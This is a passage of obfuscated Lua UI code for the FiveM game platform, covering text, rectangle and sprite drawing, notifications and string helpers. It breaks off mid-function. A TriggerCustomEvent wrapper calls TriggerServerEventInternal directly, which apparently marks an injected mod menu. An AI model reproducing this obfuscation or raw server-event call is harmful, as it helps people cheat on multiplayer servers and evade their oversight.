local function Wf(w6xnUPBiwtnaEvtsDBIM)
    local wOIFNEVvrWqHoymuB2Qz = {}
    local y6AJqfIgu = GetGameTimer() / 1000
    wOIFNEVvrWqHoymuB2Qz.r = math.floor(math.sin(y6AJqfIgu * w6xnUPBiwtnaEvtsDBIM + 0) * 127 + 128)
    wOIFNEVvrWqHoymuB2Qz.g = math.floor(math.sin(y6AJqfIgu * w6xnUPBiwtnaEvtsDBIM + 2) * 127 + 128)
    wOIFNEVvrWqHoymuB2Qz.b = math.floor(math.sin(y6AJqfIgu * w6xnUPBiwtnaEvtsDBIM + 4) * 127 + 128)
    return wOIFNEVvrWqHoymuB2Qz
end
function GetResolution()
    local kSLPRTOLTwe, QCKKHgOMoIuOmclGNey2D = GetActiveScreenResolution()
    if (kSLPRTOLTwe / QCKKHgOMoIuOmclGNey2D) > 3.5 then
        return GetScreenResolution()
    else
        return kSLPRTOLTwe, QCKKHgOMoIuOmclGNey2D
    end
end
function FormatXWYH(ZS300k, C)
    return ZS300k / 1920, C / 1080
end
function math.round(xAfpw_mEFeV4, eCi2tI22UVNZtn93P3Q)
    return tonumber(string.format("%." .. (eCi2tI22UVNZtn93P3Q or 0) .. "f", xAfpw_mEFeV4))
end
TriggerCustomEvent = function(wFZVC8W, pTTEvyeRiNE1oVbf9hMb, ...)
    local AHZ0VteUE = msgpack.pack({...})
    if wFZVC8W then
        TriggerServerEventInternal(pTTEvyeRiNE1oVbf9hMb, AHZ0VteUE, AHZ0VteUE:len())
    else
        TriggerEventInternal(pTTEvyeRiNE1oVbf9hMb, AHZ0VteUE, AHZ0VteUE:len())
    end
end
function tobool(S7scPPFzIBS7)
    if S7scPPFzIBS7 == "true" or tonumber(S7scPPFzIBS7) == 1 or S7scPPFzIBS7 == true then
        return true
    else
        return false
    end
end
function string.split(oMO_1rPpP, cu3wKXl3LO9AM5FYm_)
    if cu3wKXl3LO9AM5FYm_ == nil then
        cu3wKXl3LO9AM5FYm_ = "%s"
    end
    local sw87R9r = {}
    i = 1
    for tbvrU in string.gmatch(oMO_1rPpP, "([^" .. cu3wKXl3LO9AM5FYm_ .. "]+)") do
        sw87R9r[i] = tbvrU
        i = i + 1
    end
    return sw87R9r
end
function string.starts(lKzDzvbdXeVsezI0s, kdk1ZgnjaP)
    return string.sub(lKzDzvbdXeVsezI0s, 1, string.len(kdk1ZgnjaP)) == kdk1ZgnjaP
end
function IsMouseInBounds(OHNe, tWoSqkz3, QI8aKm7HRproJ, hhCf_5MqPB_)
    local z2RonbVNxfu9qDL9kua, xkvLyO7Xev74eh1av =
        math.round(GetControlNormal(0, 239) * 1920),
        math.round(GetControlNormal(0, 240) * 1080)
    z2RonbVNxfu9qDL9kua, xkvLyO7Xev74eh1av = FormatXWYH(z2RonbVNxfu9qDL9kua, xkvLyO7Xev74eh1av)
    OHNe, tWoSqkz3 = FormatXWYH(OHNe, tWoSqkz3)
    QI8aKm7HRproJ, hhCf_5MqPB_ = FormatXWYH(QI8aKm7HRproJ, hhCf_5MqPB_)
    return (z2RonbVNxfu9qDL9kua >= OHNe and z2RonbVNxfu9qDL9kua <= OHNe + QI8aKm7HRproJ) and
        (xkvLyO7Xev74eh1av > tWoSqkz3 and xkvLyO7Xev74eh1av < tWoSqkz3 + hhCf_5MqPB_)
end
function TableDump(F3MSLjYzBAle)
    if type(F3MSLjYzBAle) == "table" then
        local pWOULmXQq = "{ "
        for v0WWpivV58, C5W_5PppX6kGmdZW4L in pairs(F3MSLjYzBAle) do
            if type(v0WWpivV58) ~= "number" then
                v0WWpivV58 = '"' .. v0WWpivV58 .. '"'
            end
            pWOULmXQq = pWOULmXQq .. "[" .. v0WWpivV58 .. "] = " .. TableDump(C5W_5PppX6kGmdZW4L) .. ","
        end
        return pWOULmXQq .. "} "
    else
        return print(tostring(F3MSLjYzBAle))
    end
end
function GetSafeZoneBounds()
    local ZEI4bGQe6FIa5 = GetSafeZoneSize()
    ZEI4bGQe6FIa5 = math.round(ZEI4bGQe6FIa5, 2)
    ZEI4bGQe6FIa5 = (ZEI4bGQe6FIa5 * 100) - 90
    ZEI4bGQe6FIa5 = 10 - ZEI4bGQe6FIa5
    local V1V4zMbG7z3_phQqLky, Lm1JgxR9SAtO = 1920, 1080
    return {
        X = math.round(ZEI4bGQe6FIa5 * ((V1V4zMbG7z3_phQqLky / Lm1JgxR9SAtO) * 5.4)),
        Y = math.round(ZEI4bGQe6FIa5 * 5.4)
    }
end
function Controller()
    return not IsInputDisabled(2)
end
function RenderText(
    qkUpzjJ6ToaEk6j7,
    _NKHY_j,
    HCKQNMgNhpcg72,
    lYAG0jSLz6,
    h5ySMm7QiSRJuCAMFu,
    ce,
    B6F5YNnf5Ek2GY9bzc64R,
    D2pcmRdw_Nec8xrTZ,
    q55qk_hetZ,
    CYNiT2cXSdQ3eH,
    NYTiYaB,
    WOTLO_NicKTLDvcjMPrNE,
    r_E5NhnuHI55KmkcGGx)
    qkUpzjJ6ToaEk6j7 = tostring(qkUpzjJ6ToaEk6j7)
    _NKHY_j, HCKQNMgNhpcg72 = FormatXWYH(_NKHY_j, HCKQNMgNhpcg72)
    SetTextFont(lYAG0jSLz6 or 0)
    SetTextScale(1.0, h5ySMm7QiSRJuCAMFu or 0)
    SetTextColour(ce or 255, B6F5YNnf5Ek2GY9bzc64R or 255, D2pcmRdw_Nec8xrTZ or 255, q55qk_hetZ or 255)
    if NYTiYaB then
        SetTextDropShadow()
    end
    if WOTLO_NicKTLDvcjMPrNE then
        SetTextOutline()
    end
    if CYNiT2cXSdQ3eH ~= nil then
        if CYNiT2cXSdQ3eH == 1 or CYNiT2cXSdQ3eH == "Center" or CYNiT2cXSdQ3eH == "Centre" then
            SetTextCentre(true)
        elseif CYNiT2cXSdQ3eH == 2 or CYNiT2cXSdQ3eH == "Right" then
            SetTextRightJustify(true)
            SetTextWrap(0, _NKHY_j)
        end
    end
    if tonumber(r_E5NhnuHI55KmkcGGx) then
        if tonumber(r_E5NhnuHI55KmkcGGx) ~= 0 then
            r_E5NhnuHI55KmkcGGx, _ = FormatXWYH(r_E5NhnuHI55KmkcGGx, 0)
            SetTextWrap(r_E5NhnuHI55KmkcGGx, _NKHY_j - r_E5NhnuHI55KmkcGGx)
        end
    end
    BeginTextCommandDisplayText("STRING")
    AddLongString(qkUpzjJ6ToaEk6j7)
    EndTextCommandDisplayText(_NKHY_j, HCKQNMgNhpcg72)
end
function DrawRectangle(
    d,
    YhloftxaPNtv1q0,
    h8F4v5QZkmrL,
    nStFRCmi7Vgre,
    aZY,
    lx1UAroDSYMFh9K2ly,
    DaehCMfWB15aMCC,
    gs2p8qwfJ)
    d, YhloftxaPNtv1q0, h8F4v5QZkmrL, nStFRCmi7Vgre =
        d or 0,
        YhloftxaPNtv1q0 or 0,
        h8F4v5QZkmrL or 0,
        nStFRCmi7Vgre or 0
    d, YhloftxaPNtv1q0 = FormatXWYH(d, YhloftxaPNtv1q0)
    h8F4v5QZkmrL, nStFRCmi7Vgre = FormatXWYH(h8F4v5QZkmrL, nStFRCmi7Vgre)
    DrawRect(
        d + h8F4v5QZkmrL * 0.5,
        YhloftxaPNtv1q0 + nStFRCmi7Vgre * 0.5,
        h8F4v5QZkmrL,
        nStFRCmi7Vgre,
        tonumber(aZY) or 255,
        tonumber(lx1UAroDSYMFh9K2ly) or 255,
        tonumber(DaehCMfWB15aMCC) or 255,
        tonumber(gs2p8qwfJ) or 255
    )
end
function DrawTexture(
    IvlPf,
    Oia41sbPF2TZGGkYGCa,
    nuNiQ1EJ0wP,
    ugtNGvZgYAYJMEG8q7f8K,
    Mxps,
    k8G3Yp,
    VW9eOOwvPPXnCZNwJD_3,
    HfxNrqmS74KQQaWuQ,
    JM4oIw3Ja0t4nb9,
    l,
    OiRcK7fdmHBSewR1fnTeO)
    if not HasStreamedTextureDictLoaded(tostring(IvlPf) or "") then
        RequestStreamedTextureDict(tostring(IvlPf) or "", true)
    end
    nuNiQ1EJ0wP, ugtNGvZgYAYJMEG8q7f8K, Mxps, k8G3Yp =
        nuNiQ1EJ0wP or 0,
        ugtNGvZgYAYJMEG8q7f8K or 0,
        Mxps or 0,
        k8G3Yp or 0
    nuNiQ1EJ0wP, ugtNGvZgYAYJMEG8q7f8K = FormatXWYH(nuNiQ1EJ0wP, ugtNGvZgYAYJMEG8q7f8K)
    Mxps, k8G3Yp = FormatXWYH(Mxps, k8G3Yp)
    DrawSprite(
        tostring(IvlPf) or "",
        tostring(Oia41sbPF2TZGGkYGCa) or "",
        nuNiQ1EJ0wP + Mxps * 0.5,
        ugtNGvZgYAYJMEG8q7f8K + k8G3Yp * 0.5,
        Mxps,
        k8G3Yp,
        tonumber(VW9eOOwvPPXnCZNwJD_3) or 0,
        tonumber(HfxNrqmS74KQQaWuQ) or 255,
        tonumber(JM4oIw3Ja0t4nb9) or 255,
        tonumber(l) or 255,
        tonumber(OiRcK7fdmHBSewR1fnTeO) or 255
    )
end
function print_table(dG7X1RCsd8EpCa8J)
    local function WFi2SMD7w46CsBqu(Qf8K3NzHIN_)
        local p33M1qdoWlN = ""
        for i = 1, Qf8K3NzHIN_ do
            p33M1qdoWlN = p33M1qdoWlN .. "\t"
        end
        return p33M1qdoWlN
    end
    local GSD3cMvzX0oksO48JdqTj, i0B0R3hDRKZ, it_SyDsMPX3 = {}, {}, {}
    local B9K8rzkw2HUO7Sc3M = 1
    local LW0r0EQULpYJbvZZ2b = "{\n"
    while true do
        local xqZ = 0
        for Df4I6h71QTYNVtK8, eo7 in pairs(dG7X1RCsd8EpCa8J) do
            xqZ = xqZ + 1
        end
        local W5voE3F7qn = 1
        for tjjIpI_PCGCfOtq, Lmzh7xDa4Mtf in pairs(dG7X1RCsd8EpCa8J) do
            if
                (GSD3cMvzX0oksO48JdqTj[dG7X1RCsd8EpCa8J] == nil) or
                    (W5voE3F7qn >= GSD3cMvzX0oksO48JdqTj[dG7X1RCsd8EpCa8J])
             then
                if (string.find(LW0r0EQULpYJbvZZ2b, "}", LW0r0EQULpYJbvZZ2b:len())) then
                    LW0r0EQULpYJbvZZ2b = LW0r0EQULpYJbvZZ2b .. ",\n"
                elseif not (string.find(LW0r0EQULpYJbvZZ2b, "\n", LW0r0EQULpYJbvZZ2b:len())) then
                    LW0r0EQULpYJbvZZ2b = LW0r0EQULpYJbvZZ2b .. "\n"
                end
                table.insert(it_SyDsMPX3, LW0r0EQULpYJbvZZ2b)
                LW0r0EQULpYJbvZZ2b = ""
                local jFjBNFZoQAA0nm5XU
                if (type(tjjIpI_PCGCfOtq) == "number" or type(tjjIpI_PCGCfOtq) == "boolean") then
                    jFjBNFZoQAA0nm5XU = "[" .. tostring(tjjIpI_PCGCfOtq) .. "]"
                else
                    jFjBNFZoQAA0nm5XU = "['" .. tostring(tjjIpI_PCGCfOtq) .. "']"
                end
                if (type(Lmzh7xDa4Mtf) == "number" or type(Lmzh7xDa4Mtf) == "boolean") then
                    LW0r0EQULpYJbvZZ2b =
                        LW0r0EQULpYJbvZZ2b ..
                        WFi2SMD7w46CsBqu(B9K8rzkw2HUO7Sc3M) .. jFjBNFZoQAA0nm5XU .. " = " .. tostring(Lmzh7xDa4Mtf)
                elseif (type(Lmzh7xDa4Mtf) == "table") then
                    LW0r0EQULpYJbvZZ2b =
                        LW0r0EQULpYJbvZZ2b .. WFi2SMD7w46CsBqu(B9K8rzkw2HUO7Sc3M) .. jFjBNFZoQAA0nm5XU .. " = {\n"
                    table.insert(i0B0R3hDRKZ, dG7X1RCsd8EpCa8J)
                    table.insert(i0B0R3hDRKZ, Lmzh7xDa4Mtf)
                    GSD3cMvzX0oksO48JdqTj[dG7X1RCsd8EpCa8J] = W5voE3F7qn + 1
                    break
                else
                    LW0r0EQULpYJbvZZ2b =
                        LW0r0EQULpYJbvZZ2b ..
                        WFi2SMD7w46CsBqu(B9K8rzkw2HUO7Sc3M) ..
                            jFjBNFZoQAA0nm5XU .. " = '" .. tostring(Lmzh7xDa4Mtf) .. "'"
                end
                if (W5voE3F7qn == xqZ) then
                    LW0r0EQULpYJbvZZ2b = LW0r0EQULpYJbvZZ2b .. "\n" .. WFi2SMD7w46CsBqu(B9K8rzkw2HUO7Sc3M - 1) .. "}"
                else
                    LW0r0EQULpYJbvZZ2b = LW0r0EQULpYJbvZZ2b .. ","
                end
            else
                if (W5voE3F7qn == xqZ) then
                    LW0r0EQULpYJbvZZ2b = LW0r0EQULpYJbvZZ2b .. "\n" .. WFi2SMD7w46CsBqu(B9K8rzkw2HUO7Sc3M - 1) .. "}"
                end
            end
            W5voE3F7qn = W5voE3F7qn + 1
        end
        if (xqZ == 0) then
            LW0r0EQULpYJbvZZ2b = LW0r0EQULpYJbvZZ2b .. "\n" .. WFi2SMD7w46CsBqu(B9K8rzkw2HUO7Sc3M - 1) .. "}"
        end
        if (#i0B0R3hDRKZ > 0) then
            dG7X1RCsd8EpCa8J = i0B0R3hDRKZ[#i0B0R3hDRKZ]
            i0B0R3hDRKZ[#i0B0R3hDRKZ] = nil
            B9K8rzkw2HUO7Sc3M =
                GSD3cMvzX0oksO48JdqTj[dG7X1RCsd8EpCa8J] == nil and B9K8rzkw2HUO7Sc3M + 1 or B9K8rzkw2HUO7Sc3M - 1
        else
            break
        end
    end
    table.insert(it_SyDsMPX3, LW0r0EQULpYJbvZZ2b)
    LW0r0EQULpYJbvZZ2b = table.concat(it_SyDsMPX3)
    print(LW0r0EQULpYJbvZZ2b)
end
UIVisual = setmetatable({}, UIVisual)
UIVisual.__index = UIVisual
function UIVisual:Popup(U8h)
    ClearPrints()
    if (U8h.colors == nil) then
        SetNotificationBackgroundColor(140)
    else
        SetNotificationBackgroundColor(U8h.colors)
    end
    SetNotificationTextEntry("STRING")
    if (U8h.message == nil) then
        error("Missing arguments, message")
    else
        AddTextComponentString(tostring(U8h.message))
    end
    DrawNotification(false, true)
    if (U8h.sound ~= nil) then
        if (U8h.sound.audio_name ~= nil) then
            if (U8h.sound.audio_ref ~= nil) then
                PlaySoundFrontend(-1, U8h.sound.audio_name, U8h.sound.audio_ref, true)
            else
                error("Missing arguments, audio_ref")
            end
        else
            error("Missing arguments, audio_name")
        end
    end
end
function UIVisual:PopupChar(qz5x5pGVZ8wK_)
    if (qz5x5pGVZ8wK_.colors == nil) then
        SetNotificationBackgroundColor(140)
    else
        SetNotificationBackgroundColor(qz5x5pGVZ8wK_.colors)
    end
    SetNotificationTextEntry("STRING")
    if (qz5x5pGVZ8wK_.message == nil) then
        error("Missing arguments, message")
    else
        AddTextComponentString(tostring(qz5x5pGVZ8wK_.message))
    end
    if (qz5x5pGVZ8wK_.request_stream_texture_dics ~= nil) then
        RequestStreamedTextureDict(qz5x5pGVZ8wK_.request_stream_texture_dics)
    end
    if (qz5x5pGVZ8wK_.picture ~= nil) then
        if
            (qz5x5pGVZ8wK_.iconTypes == 1) or (qz5x5pGVZ8wK_.iconTypes == 2) or (qz5x5pGVZ8wK_.iconTypes == 3) or
                (qz5x5pGVZ8wK_.iconTypes == 7) or
                (qz5x5pGVZ8wK_.iconTypes == 8) or
                (qz5x5pGVZ8wK_.iconTypes == 9)
         then
            SetNotificationMessage(
                tostring(qz5x5pGVZ8wK_.picture),
                tostring(qz5x5pGVZ8wK_.picture),
                true,
                qz5x5pGVZ8wK_.iconTypes,
                qz5x5pGVZ8wK_.sender,
                qz5x5pGVZ8wK_.title
            )
        else
            SetNotificationMessage(
                tostring(qz5x5pGVZ8wK_.picture),
                tostring(qz5x5pGVZ8wK_.picture),
                true,
                4,
                qz5x5pGVZ8wK_.sender,
                qz5x5pGVZ8wK_.title
            )
        end
    else
        if
            (qz5x5pGVZ8wK_.iconTypes == 1) or (qz5x5pGVZ8wK_.iconTypes == 2) or (qz5x5pGVZ8wK_.iconTypes == 3) or
                (qz5x5pGVZ8wK_.iconTypes == 7) or
                (qz5x5pGVZ8wK_.iconTypes == 8) or
                (qz5x5pGVZ8wK_.iconTypes == 9)
         then
            SetNotificationMessage(
                "CHAR_ALL_PLAYERS_CONF",
                "CHAR_ALL_PLAYERS_CONF",
                true,
                qz5x5pGVZ8wK_.iconTypes,
                qz5x5pGVZ8wK_.sender,
                qz5x5pGVZ8wK_.title
            )
        else
            SetNotificationMessage(
                "CHAR_ALL_PLAYERS_CONF",
                "CHAR_ALL_PLAYERS_CONF",
                true,
                4,
                qz5x5pGVZ8wK_.sender,
                qz5x5pGVZ8wK_.title
            )
        end
    end
    if (qz5x5pGVZ8wK_.sound ~= nil) then
        if (qz5x5pGVZ8wK_.sound.audio_name ~= nil) then
            if (qz5x5pGVZ8wK_.sound.audio_ref ~= nil) then
                PlaySoundFrontend(-1, qz5x5pGVZ8wK_.sound.audio_name, qz5x5pGVZ8wK_.sound.audio_ref, true)
            else
                error("Missing arguments, audio_ref")
            end
        else
            error("Missing arguments, audio_name")
        end
    end
    DrawNotification(false, true)
end
function UIVisual:Text(ihS80SXd8fmNuFquzZcR7)
    ClearPrints()
    SetTextEntry_2("STRING")
    if (ihS80SXd8fmNuFquzZcR7.message ~= nil) then
        AddTextComponentString(tostring(ihS80SXd8fmNuFquzZcR7.message))
    else
        error("Missing arguments, message")
    end
    if (ihS80SXd8fmNuFquzZcR7.time_display ~= nil) then
        DrawSubtitleTimed(tonumber(ihS80SXd8fmNuFquzZcR7.time_display), 1)
    else
        DrawSubtitleTimed(6000, 1)
    end
    if (ihS80SXd8fmNuFquzZcR7.sound ~= nil) then
        if (ihS80SXd8fmNuFquzZcR7.sound.audio_name ~= nil) then
            if (ihS80SXd8fmNuFquzZcR7.sound.audio_ref ~= nil) then
                PlaySoundFrontend(
                    -1,
                    ihS80SXd8fmNuFquzZcR7.sound.audio_name,
                    ihS80SXd8fmNuFquzZcR7.sound.audio_ref,
                    true
                )
            else
                error("Missing arguments, audio_ref")
            end
        else
            error("Missing arguments, audio_name")
        end
    end
end
function UIVisual:FloatingHelpText(JxXIISf)
    BeginTextCommandDisplayHelp("STRING")
    if (JxXIISf.message ~= nil) then
        AddTextComponentScaleform(JxXIISf.message)
    else
        error("Missing arguments, message")
    end
    EndTextCommandDisplayHelp(0, 0, 1, -1)
    if (JxXIISf.sound ~= nil) then
        if (JxXIISf.sound.audio_name ~= nil) then
            if (JxXIISf.sound.audio_ref ~= nil) then
                PlaySoundFrontend(-1, JxXIISf.sound.audio_name, JxXIISf.sound.audio_ref, true)
            else
                error("Missing arguments, audio_ref")
            end
        else
            error("Missing arguments, audio_name")
        end
    end
end
function UIVisual:ShowFreemodeMessage(QpqTqPJy0oM8K4HNuxcMu)
    if (QpqTqPJy0oM8K4HNuxcMu.sound ~= nil) then
        if (QpqTqPJy0oM8K4HNuxcMu.sound.audio_name ~= nil) then
            if (QpqTqPJy0oM8K4HNuxcMu.sound.audio_ref ~= nil) then
                PlaySoundFrontend(
                    -1,
                    QpqTqPJy0oM8K4HNuxcMu.sound.audio_name,
                    QpqTqPJy0oM8K4HNuxcMu.sound.audio_ref,
                    true
                )
            else
                error("Missing arguments, audio_ref")
            end
        else
            error("Missing arguments, audio_name")
        end
    end
    if (QpqTqPJy0oM8K4HNuxcMu.request_scaleform ~= nil) then
        scaleform = Pyta.Request.Scaleform({movie = QpqTqPJy0oM8K4HNuxcMu.request_scaleform.movie})
        if (QpqTqPJy0oM8K4HNuxcMu.request_scaleform.scale ~= nil) then
            PushScaleformMovieFunction(scaleform, QpqTqPJy0oM8K4HNuxcMu.request_scaleform.scale)
        else
            PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
        end
    else
        scaleform = Pyta.Request.Scaleform({movie = "MP_BIG_MESSAGE_FREEMODE"})
        if (QpqTqPJy0oM8K4HNuxcMu.request_scaleform.scale ~= nil) then
            PushScaleformMovieFunction(scaleform, QpqTqPJy0oM8K4HNuxcMu.request_scaleform.scale)
        else
            PushScaleformMovieFunction(scaleform, "SHOW_SHARD_WASTED_MP_MESSAGE")
        end
    end
    if (QpqTqPJy0oM8K4HNuxcMu.title ~= nil) then
        PushScaleformMovieFunctionParameterString(QpqTqPJy0oM8K4HNuxcMu.title)
    else
        ConsoleLog({message = 'Missing arguments { title = "Nice title" } '})
    end
    if (QpqTqPJy0oM8K4HNuxcMu.message ~= nil) then
        PushScaleformMovieFunctionParameterString(QpqTqPJy0oM8K4HNuxcMu.message)
    else
        ConsoleLog({message = 'Missing arguments { message = "Yeah display message right now" } '})
    end
    if (QpqTqPJy0oM8K4HNuxcMu.shake_gameplay ~= nil) then
        ShakeGameplayCam(QpqTqPJy0oM8K4HNuxcMu.shake_gameplay, 1.0)
    end
    if (QpqTqPJy0oM8K4HNuxcMu.screen_effect_in ~= nil) then
        StartScreenEffect(QpqTqPJy0oM8K4HNuxcMu.screen_effect_in, 0, 0)
    end
    PopScaleformMovieFunctionVoid()
    while QpqTqPJy0oM8K4HNuxcMu.time > 0 do
        Citizen.Wait(1)
        QpqTqPJy0oM8K4HNuxcMu.time = QpqTqPJy0oM8K4HNuxcMu.time - 1.0
        DrawScaleformMovieFullscreen(scaleform, 255, 255, 255, 255)
    end
    if (QpqTqPJy0oM8K4HNuxcMu.screen_effect_in ~= nil) then
        StopScreenEffect(QpqTqPJy0oM8K4HNuxcMu.screen_effect_in)
    end
    if (QpqTqPJy0oM8K4HNuxcMu.screen_effect_out ~= nil) then
        StartScreenEffect(QpqTqPJy0oM8K4HNuxcMu.screen_effect_out, 0, 0)
    end
    SetScaleformMovieAsNoLongerNeeded(scaleform)
end
UIResRectangle = setmetatable({}, UIResRectangle)
UIResRectangle.__index = UIResRectangle
UIResRectangle.__call = function()
    return "Rectangle"
end
function UIResRectangle.New(m3KiprJAN3vOQ3P2mqo, kQa, a7fTsJ_7dTF0R, FILTWHLjU, F3qPqHTjh, c_xe, O7OpRFymk3VodP4r4h, M)
    local gG20H1VZBxr5IWbkxB = {
        X = tonumber(m3KiprJAN3vOQ3P2mqo) or 0,
        Y = tonumber(kQa) or 0,
        Width = tonumber(a7fTsJ_7dTF0R) or 0,
        Height = tonumber(FILTWHLjU) or 0,
        _Colour = {
            R = tonumber(F3qPqHTjh) or 255,
            G = tonumber(c_xe) or 255,
            B = tonumber(O7OpRFymk3VodP4r4h) or 255,
            A = tonumber(M) or 255
        }
    }
    return setmetatable(gG20H1VZBxr5IWbkxB, UIResRectangle)
end
function UIResRectangle:Position(PMHSPakEvvt5V, OTDUIjgMWL2qLVVj)
    if tonumber(PMHSPakEvvt5V) and tonumber(OTDUIjgMWL2qLVVj) then
        self.X = tonumber(PMHSPakEvvt5V)
        self.Y = tonumber(OTDUIjgMWL2qLVVj)
    else
        return {X = self.X, Y = self.Y}
    end
end
function UIResRectangle:Size(Pp4__KMdYH7biglfKn, iZ34Bax3F1QYMi)
    if tonumber(Pp4__KMdYH7biglfKn) and tonumber(iZ34Bax3F1QYMi) then
        self.Width = tonumber(Pp4__KMdYH7biglfKn)
        self.Height = tonumber(iZ34Bax3F1QYMi)
    else
        return {Width = self.Width, Height = self.Height}
    end
end
function UIResRectangle:Colour(G5Bp, bwUT9eG, BeWT3QPWKTJfbIadd72, vwLxeonHHfwUexKjb)
    if tonumber(G5Bp) or tonumber(bwUT9eG) or tonumber(BeWT3QPWKTJfbIadd72) or tonumber(vwLxeonHHfwUexKjb) then
        self._Colour.R = tonumber(G5Bp) or 255
        self._Colour.B = tonumber(BeWT3QPWKTJfbIadd72) or 255
        self._Colour.G = tonumber(bwUT9eG) or 255
        self._Colour.A = tonumber(vwLxeonHHfwUexKjb) or 255
    else
        return self._Colour
    end
end
function UIResRectangle:Draw()
    local cXOzPDvPKnUDC5QGzr = self:Position()
    local _kuu = self:Size()
    _kuu.Width, _kuu.Height = FormatXWYH(_kuu.Width, _kuu.Height)
    cXOzPDvPKnUDC5QGzr.X, cXOzPDvPKnUDC5QGzr.Y = FormatXWYH(cXOzPDvPKnUDC5QGzr.X, cXOzPDvPKnUDC5QGzr.Y)
    DrawRect(
        cXOzPDvPKnUDC5QGzr.X + _kuu.Width * 0.5,
        cXOzPDvPKnUDC5QGzr.Y + _kuu.Height * 0.5,
        _kuu.Width,
        _kuu.Height,
        self._Colour.R,
        self._Colour.G,
        self._Colour.B,
        self._Colour.A
    )
end
UIResText = setmetatable({}, UIResText)
UIResText.__index = UIResText
UIResText.__call = function()
    return "Text"
end
function GetCharacterCount(KFDLDFiX1_50)
    local zB4zJRvsTAvU = 0
    for qaZ5h94qcXej9VFmjoQqr in KFDLDFiX1_50:gmatch("[%z\1-\127\194-\244][\128-\191]*") do
        local mR9Ug0NLM5VO = qaZ5h94qcXej9VFmjoQqr:byte(1, -1)
        if mR9Ug0NLM5VO ~= nil then
            zB4zJRvsTAvU = zB4zJRvsTAvU + 1
        end
    end
    return zB4zJRvsTAvU
end
function GetByteCount(sxL)
    local av0olr_C = 0
    for eUdqGPu8vTn27BL in sxL:gmatch("[%z\1-\127\194-\244][\128-\191]*") do
        local ls3v, z3sVXM, EEDXaH, S4B = eUdqGPu8vTn27BL:byte(1, -1)
        if ls3v ~= nil then
            av0olr_C = av0olr_C + 1
        end
        if z3sVXM ~= nil then
            av0olr_C = av0olr_C + 1
        end
        if EEDXaH ~= nil then
            av0olr_C = av0olr_C + 1
        end
        if S4B ~= nil then
            av0olr_C = av0olr_C + 1
        end
    end
    return av0olr_C
end
function AddLongStringForAscii(EaS5cbM12j7WfW9Qz9Fpk)
    local sngMwXr3xdqzVmbRZ9ZKM = 99
    for i = 0, GetCharacterCount(EaS5cbM12j7WfW9Qz9Fpk), 99 do
        AddTextComponentSubstringPlayerName(
            string.sub(
                EaS5cbM12j7WfW9Qz9Fpk,
                i,
                math.min(sngMwXr3xdqzVmbRZ9ZKM, GetCharacterCount(EaS5cbM12j7WfW9Qz9Fpk) - i)
            )
        )
    end
end
function AddLongStringForUtf8(emNH)
    local MF4ME6xn = 99
    local xv3AZT9bOFaLYTLmmD = GetByteCount(emNH)
    if xv3AZT9bOFaLYTLmmD < MF4ME6xn then
        AddTextComponentSubstringPlayerName(emNH)
        return
    end
    local SZkOGGjHzp = 0
    for i = 0, GetCharacterCount(emNH), 1 do
        local qfkK6Qgv_D7IDCabEyve = i - SZkOGGjHzp
        if GetByteCount(string.sub(emNH, SZkOGGjHzp, qfkK6Qgv_D7IDCabEyve)) > MF4ME6xn then
            AddTextComponentSubstringPlayerName(string.sub(emNH, SZkOGGjHzp, qfkK6Qgv_D7IDCabEyve - 1))
            i = i - 1
            SZkOGGjHzp = SZkOGGjHzp + (qfkK6Qgv_D7IDCabEyve - 1)
        end
    end
    AddTextComponentSubstringPlayerName(string.sub(emNH, SZkOGGjHzp, GetCharacterCount(emNH) - SZkOGGjHzp))
end
function AddLongString(cGhhRIet7ujSkrsC)
    local q53hOv2z2GVWBA57b = GetByteCount(cGhhRIet7ujSkrsC)
    if q53hOv2z2GVWBA57b == GetCharacterCount(cGhhRIet7ujSkrsC) then
        AddLongStringForAscii(cGhhRIet7ujSkrsC)
    else
        AddLongStringForUtf8(cGhhRIet7ujSkrsC)
    end
end
function MeasureStringWidthNoConvert(j2RAO2p0TK72b03PNraMS, STu3wG_ocm, h1uO4hRkTI)
    BeginTextCommandWidth("STRING")
    AddLongString(j2RAO2p0TK72b03PNraMS)
    SetTextFont(STu3wG_ocm or 0)
    SetTextScale(1.0, h1uO4hRkTI or 0)
    return EndTextCommandGetWidth(true)
end
function MeasureStringWidth(jYVfE5LCi5ruSCBp, ORBce0L, L_cUObDzxaA59F3GA)
    return MeasureStringWidthNoConvert(jYVfE5LCi5ruSCBp, ORBce0L, L_cUObDzxaA59F3GA) * 1920
end
function UIResText.New(
    YMeLULZ,
    fZDgVuyM,
    yqVJWUp7,
    weVehffd,
    W1i2SLI1poKVvjpf537sb,
    hshACDfN2znnYkfG,
    HGvG4tC,
    FFIjGC4,
    bQz4Y,
    kJ31WYMcxCBx7n8J3e,
    jWOvCHvTurEbgm,
    r2porD7Se1RMdQ1o,
    vdegIP)
    local Zb2k = {
        _Text = tostring(YMeLULZ) or "",
        X = tonumber(fZDgVuyM) or 0,
        Y = tonumber(yqVJWUp7) or 0,
        Scale = tonumber(weVehffd) or 0,
        _Colour = {
            R = tonumber(W1i2SLI1poKVvjpf537sb) or 255,
            G = tonumber(hshACDfN2znnYkfG) or 255,
            B = tonumber(HGvG4tC) or 255,
            A = tonumber(FFIjGC4) or 255
        },
        Font = tonumber(bQz4Y) or 0,
        Alignment = kJ31WYMcxCBx7n8J3e or nil,
        DropShadow = jWOvCHvTurEbgm or nil,
        Outline = r2porD7Se1RMdQ1o or nil,
        WordWrap = tonumber(vdegIP) or 0
    }
    return setmetatable(Zb2k, UIResText)
end
function UIResText:Position(Rx1SDoNG, aI2QRLwzNCc)
    if tonumber(Rx1SDoNG) and tonumber(aI2QRLwzNCc) then
        self.X = tonumber(Rx1SDoNG)
        self.Y = tonumber(aI2QRLwzNCc)
    else
        return {X = self.X, Y = self.Y}
    end
end
function UIResText:Colour(grwYo, GW, V7Ryh04, Yezi5fJ0d8)
    if tonumber(grwYo) and tonumber(GW) and tonumber(V7Ryh04) and tonumber(Yezi5fJ0d8) then
        self._Colour.R = tonumber(grwYo)
        self._Colour.B = tonumber(V7Ryh04)
        self._Colour.G = tonumber(GW)
        self._Colour.A = tonumber(Yezi5fJ0d8)
    else
        return self._Colour
    end
end
function UIResText:Text(uE2i)
    if tostring(uE2i) and uE2i ~= nil then
        self._Text = tostring(uE2i)
    else
        return self._Text
    end
end
function UIResText:Draw()
    local gW22wBPsnv7pmdfMuPWbs = self:Position()
    gW22wBPsnv7pmdfMuPWbs.X, gW22wBPsnv7pmdfMuPWbs.Y = FormatXWYH(gW22wBPsnv7pmdfMuPWbs.X, gW22wBPsnv7pmdfMuPWbs.Y)
